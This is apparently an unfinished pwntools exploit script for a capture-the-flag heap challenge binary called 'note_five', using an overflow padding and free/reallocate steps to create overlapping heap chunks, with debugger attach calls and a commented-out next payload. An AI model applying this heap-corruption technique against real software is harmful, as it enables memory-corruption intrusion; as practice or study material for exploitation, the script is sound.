from pwn import *
context.log_level = 'debug'

def ru(data):
	p.recvuntil(data)

def sl(data):
	p.sendline(data)

def sd(data):
	p.send(data)

def rv():
	p.recv()

def new(idx,size):
	ru("choice>> ")
	sl("1")
	ru("idx: ")
	sl(str(idx))
	ru("size: ")
	sl(str(size))

def edit(idx,data):
	ru("choice>> ")
	sl("2")
	ru("idx: ")
	sl(str(idx))
	ru("content: ")
	sl(data)

def delete(idx):
	ru("choice>> ")
	sl("3")
	ru("idx: ")
	sl(str(idx))

p = process('./note_five')
new(0,0xf8)
new(1,0xf8)
new(2,0xf8)
new(3,0xf8)
new(4,0xf8)

padding="\xf1"*0x99
edit(0,padding)

#ovelapping 
delete(1)
new(1,0x1e8)
gdb.attach(p)
delete(2)

#padding2 = "A"*0xf0+p64(0)+p64(0xf1)+"a"*0xe0+p64(0)+"\xa1"
#edit(1,padding2)

gdb.attach(p)

